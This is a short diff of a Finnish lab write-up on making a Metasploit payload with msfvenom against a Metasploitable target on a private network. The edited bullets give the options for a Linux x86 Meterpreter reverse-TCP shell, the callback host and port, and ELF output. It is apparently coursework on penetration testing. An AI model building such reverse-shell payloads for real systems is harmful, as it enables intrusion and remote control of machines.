@@ -12,7 +12,7 @@ Seurasin artikkelia https://www.beyondtrust.com/blog/entry/how-to-use-metasploit
 Kohteena käytän metasploitablea (192.168.56.101) ja hyökkäyskoneena kali (192.168.56.1).
 
 Payloadin luomiseksi käytin seuraavio valintoja:
-* `-p cmd/`: Payloadiksi valitaan x86 arkkitehtuurin linuxiin tarkoitettu meterpeter reverse tcp -shell, eli meterpreter ohtaa kohteen koneelta yhteyden hyökkääjään.
+* `-p linux/x86/meterpreter/reverse_tcp`: Payloadiksi valitaan x86 arkkitehtuurin linuxiin tarkoitettu meterpeter reverse tcp -shell, eli meterpreter ohtaa kohteen koneelta yhteyden hyökkääjään.
 * `LHOST=192.168.56.1 LPORT=4444`: Hyökkääjän IP ja portti, johon meterpreter soittaa.
 * `-f elf`: Formatiksi valitaan "elf", eli msfvenom tekee payloadista linux binäärin.
 * `-o meterpreter`: Luodun binäärin nimeksi annetaan "meterpreter".
